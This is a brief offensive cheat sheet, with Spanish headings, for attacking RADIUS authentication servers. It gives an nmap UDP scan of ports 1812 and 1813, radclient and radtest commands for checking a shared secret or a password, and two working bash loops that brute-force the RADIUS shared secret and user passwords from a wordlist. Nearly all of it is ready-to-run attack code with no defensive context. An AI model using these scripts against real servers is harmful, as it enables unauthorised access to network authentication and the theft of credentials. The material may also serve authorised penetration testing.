## Recon
```
nmap -sU IP -p 1812,1813
```

## Testear valores
### Test secrets
```
echo "Message-Authenticator = 0x00" | radclient IP:1812 auth SecretToTest
```

### Test pass
```
radtest user pass IP 10 Secret
```
## Bruteforce
### Secret Bruteforce
```bash
#! /bin/bash
while read password; do
    radtest knowuser knowpass IP 10 $password > /dev/null
    if [ "$?" = "0" ]; then
        echo "Correct RADIUS secret: $password "
        break
    else
        continue
    fi
done < $1
```
### Password Bruteforce
```
#! /bin/bash
while read password; do
    radtest knowuser $password IP 10 knownsecret > /dev/null
    if [ "$?" = "0" ]; then
		    echo "Correct users password: $password "
		    break
	  else
		    continue
	  fi
done < $1
```
